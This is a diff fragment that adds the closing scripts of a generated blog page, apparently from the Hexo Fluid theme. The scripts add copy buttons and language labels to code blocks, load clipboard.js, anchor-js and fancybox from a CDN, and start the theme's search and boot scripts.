+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
